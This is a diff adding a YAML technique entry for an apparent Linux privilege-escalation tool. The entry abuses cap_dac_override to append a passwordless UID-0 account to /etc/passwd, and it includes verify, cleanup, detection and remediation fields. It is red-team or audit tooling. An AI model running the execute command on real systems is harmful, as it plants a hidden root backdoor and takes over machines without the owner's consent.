@@ -1,0 +1,41 @@
+# cap_dac_override → write any file → root
+#
+# cap_dac_override bypasses DAC write/exec/search checks. A process with it
+# can write to files it doesn't own — including /etc/passwd. Adding a UID-0
+# line makes any user root via `su`.
+#
+# Note the inlined driver's command doesn't invoke {{binary}} — it relies on
+# the operator having the cap in their own shell context (a getcap-granted
+# child would inherit through fork+exec). Same behavior preserved here; a
+# future improvement would use {{binary}} with a per-interpreter write syntax.
+#
+# MITRE: T1548.001 (Setuid/Setgid) — capabilities as fine-grained SUID.
+technique: T1548.001
+name: cap_dac_override → append UID-0 line to /etc/passwd → root
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high      # /etc/passwd write is a direct root path
+  safety: config-change      # writes to /etc/passwd; cleanup below reverses
+  detection: moderate        # /etc/passwd modification hits FIM if any is watching
+detect:
+  capability: cap_dac_override
+execute:
+  command: |-
+    echo 'fk::0:0:fk:/root:/bin/bash' >> /etc/passwd && id fk
+verify:
+  success: "uid=0"          # `id fk` returns uid=0 iff the write landed
+cleanup:
+  command: |-
+    sed -i '/^fk::0:0:/d' /etc/passwd
+report:
+  vector_type: capability
+  description: >
+    A binary with cap_dac_override can write to any file regardless of DAC
+    permissions. Appending a UID-0 line to /etc/passwd creates a passwordless
+    root account (`fk`) reachable via `su fk`.
+  remediation: >
+    Remove the capability: `setcap -r {binary}`. If the binary needs write
+    access to specific files, use fine-grained ACLs / group ownership on the
+    target files instead of granting global write bypass.
+  refs: [T1548.001, capabilities(7)]
